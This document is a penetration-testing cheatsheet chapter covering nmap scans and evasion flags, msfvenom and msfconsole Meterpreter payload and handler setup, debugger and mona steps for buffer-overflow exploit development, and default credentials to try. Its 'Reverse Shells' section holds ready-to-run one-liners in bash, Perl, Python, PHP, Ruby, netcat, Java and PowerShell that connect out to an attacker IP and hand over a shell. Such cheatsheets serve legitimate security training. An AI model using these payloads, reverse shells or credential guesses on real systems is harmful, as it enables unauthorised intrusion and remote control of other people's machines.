# Chapter 1 - Cheatsheets



## NMAP

##### Network Scan

> ###### Arguments

```
-sn - ping scan (disable port scan, assumes all hosts up)
-sP - ping scan (skip host discovery, only shows hosts that respond) 
-sL - scan list
-Pn - no ping, just scan
```

> ###### Examples

```
Kali> nmap -sn 192.168.1.0/24
Kali> nmap -sP 192.168.1.0/24
Kali> nmap -sL IPlist.txt
Kali> for ip in $(cat targets.txt);do nmap -A -T4 -oN scans/nmap.$ip.txt $ip;done
```

##### Host Scan

> ###### Arguments

```
-p- {1-65535} - 1 to 65535 ports
-p 22,80,443 - specificed ports
-6 - ipv6
-O - OS Detection
--osscan-limit - light os scan
--osscan-guess - aggressive os scan
--version-intensity {0-9} - light to aggressive
-sV - version detection
-sT - connect scan
-sU - UDP scan
-sS - stealth syn scan
-sN - tcp null scan
-sC - default scripts
-A - OS detection + nmap scripts + traceroute + version
--script {script.nse} - load specific nmap script
--script-args={args} - pass arguments to script
```

> ###### Examples

```
Kali> nmap -p 1-65535 -sV -sS -T4 $TARGET
Kali> nmap -v -sS -A -T4 $TARGET
Kali> nmap -v -sV -O -sS -T4 $TARGET

Kali> nmap -v -sC -sV -oA [directory/filename] $TARGET
```

##### Timing

> ###### Arguments

```
-n - never resolve dns
-R - always resolve dns
-T{0-5} - scan timing slow to fast
-F - fast scan
-r - scan ports consecutively
--version-intensity {0-9} - light to aggressive
--host-timeout {number}
--min-rate {number} --max-rate {number}
--max_retries {number}
```

##### Evasion

> ###### Arguments

```
-f [--mtu {number}] - fragment packets optionally with mtu
-D {decoy1,decoy2} - cloak with decoys
-S {ip} - spoof ip address
-g {port} - use given port number for scan
--proxies {url,url2} - use proxy through http/socks4
--data-length {number} - append random data to packets
--ip-options {options} - send packets with ip options
--ttl {number} - set ip ttl
--spoof-mac {mac} - spoof mac for scan
--bad-sum - send packets with bogus checksums
```

##### Output

> ###### Arguments

```
-v - verbose output
-oX - output xml
-oG - output greppable
-oA - output all formats
--open - only show potentially open ports
--packet-trace - show all packets sent/recv
--append-output - noclobber
```

## MSFVenom

> ##### Arguments

```
-p - payload
--payload-options
    Display available payloads
LHOST=ADDRESS - Argument for local IP Address
LPORT=PORT - Argument for local port
-n [number] - NOPS
--platform {Windows|Linux} - Platform to build shellcode for
-a {x86|x64} - Architecture
-e {x86/shikata_ga_nai} - encoder
-b '{badchars}' - remove badchars from payload
-v [string] - name your variable
-f {python|raw|war|asp|elf|exe} - format for payload
--smallest - attempt to make payload as tiny as possible
```

> ##### Examples

List Payloads
`msfvenom -l`

```
Kali> msfvenom -p windows/meterpreter/reverse_tcp
                lhost=192.168.1.232
                lport=4444
                --platform Windows
                -a x86
                -e x86/shikita_ga_nai
                -b '\x00\x20\x25\x2b\x2f\x5c'
                -v payload
                -f python
                --smallest
```

Creates a simple TCP payload for Windows
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > example.exe
```

## BurpSuite

> ##### Setup

```
add to scope
only show scoped items
```

> ##### Intercept Traffic

```
Chain Burp Proxy such as:
127.0.0.1:80 -> $TARGET:80
```

> ##### Shortcuts

```
Send to repeater: Ctrl+R
```

## MSFConsole

> ##### Reverse TCP

```
msfconsole> use multi/handler
msfconsole> set payload windows/meterpreter/reverse_tcp
msfconsole> set lhost 10.10.10.1
msfconsole> set lport 4444
msfconsole> set exitonsession false
msfconsole> set enablestageencoding true
```

> ##### Jobs

```
msfconsole> jobs -K
msfconsole> jobs -L
```

## GDB

> ##### Commands

```
disas - disassemble
b - breakpoint
c - continue
r - run
p - TODO
st - step
x - examine
```

> ##### Examples

```
gdb> disas main
gdb> b 0xd34dc0d3
gdb> x/200x $esp
```

## WinDBG

> ##### Commands

```
g - pass exception
gN - step
bp [address] - breakpoint
bl - list breakpoints
!exchain - view exception chain
.load pykd.pyd - load python
!py mona [command] [args] - exceute mona stuff
a -> [jmp address]
u [address] - inspect
u - view stack
t - step
```

> ##### Examples

```
!py mona findmsp
!py mona seh
```

> ##### Shortcuts

```
Open Executable: CTRL+E
Attach to process: F6
Memory: Alt+5
Close Window: Ctrl+F4
Restart: Ctrl+Shift+F5
Break: Ctrl+Break
```

## ImmunityDebugger

> ##### Shortcuts

```
Breakpoint: F2
Step: F7
Exec till Return: Ctrl+F9
Run: F9
Pause: F12
```

## Mona

> ##### Arguments

```
pc [size] - generate cyclic pattern
po [address] - find offset
findmsp - find register overwritten with pattern
bytearray -b [badchars] - generate bytes from 0x00 to 0xff excluding badchars
jmp -r [register] - find a jump point
-n - skip modules that start with 0x00
-o - skip os modules
-m - module
-cm - module property
-cpd - filter bad chars
```

> ##### Examples

```
!mona config -set workingfolder path
!mona pc 2400
!mona po d34db33f
!mona findmsp
!mona find -s "\xff\xe4" -m comctl32.dll
!mona jmp -r esp
!mona seh -cm aslr=false
!mona seh -cpb "\x00\x0a\x0d"
```

## Limited Shells

```
Kali> python -c 'import pty; pty.spawn("/bin/sh")'

Kali> echo os.system('/bin/bash')

Kali> /bin/sh -i

Kali> perl —e 'exec "/bin/sh";'
```

> ##### Resources

```
http://netsec.ws/?p=337
```

## Reverse Shells

> ##### Reverse Shell to Fully Interactive

```
Kali> python -c "import pty; pty.spawn('/bin/bash')"

CTRL+Z

Kali> stty raw -echo
Kali> fg

Kali> stty size #optional

```

> ##### Linux

```
# Bash
Kali> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

# Perl
Kali> perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
Kali> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
Kali> php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
Kali> ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat with -e
Kali> nc -e /bin/sh 10.0.0.1 1234

# Netcat without -e (my personal favourite)
Kali> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

# Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

> ##### Windows

```
PS> $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Default Credentials

A list of potentially useful default credentials to try out by hand.

```
admin:Admin
admin:admin
admin:password
admin:<no password>
root:admin
root:alpine
guest:<no password>
```

Otherwise, here is a link you can look through and CTRL+F for a vendor should it apply.
[github.com/danielmiessler/SecLists](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.csv)
